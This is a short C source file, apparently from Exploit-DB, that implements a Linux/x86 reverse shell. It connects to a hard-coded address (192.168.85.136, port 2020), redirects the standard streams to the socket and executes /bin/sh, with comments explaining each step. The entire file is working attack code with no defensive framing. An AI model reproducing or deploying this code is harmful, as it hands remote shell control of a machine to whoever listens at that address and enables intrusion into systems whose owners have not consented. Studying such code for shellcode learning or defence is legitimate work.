/*
 Title: Linux/x86 Reverse Shell code - simple C skeleton
 Author: Zsolt Agoston (agzsolt)
 Source: https://www.exploit-db.com/exploits/40075 
*/

#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <netinet/in.h>

int main()

{
int sock_file_des;							// socket file descriptor

struct sockaddr_in sock_ad;						// node address and port
sock_ad.sin_family = AF_INET; 
sock_ad.sin_port = htons(2020);						// use port 2020
sock_ad.sin_addr.s_addr = inet_addr("192.168.85.136");			// connect back to "192.168.85.136"

sock_file_des = socket(AF_INET, SOCK_STREAM, 0);			// create socket, man page: socket(int domain, int type, int protocol)

connect(sock_file_des,(struct sockaddr *) &sock_ad,sizeof(sock_ad));	// connect to socket

dup2(sock_file_des, 0);							// redirect stdin
dup2(sock_file_des, 1);							// redirect stdout
dup2(sock_file_des, 2);							// redirect stderr

execve("/bin/sh", 0, 0);						// execute shell
}
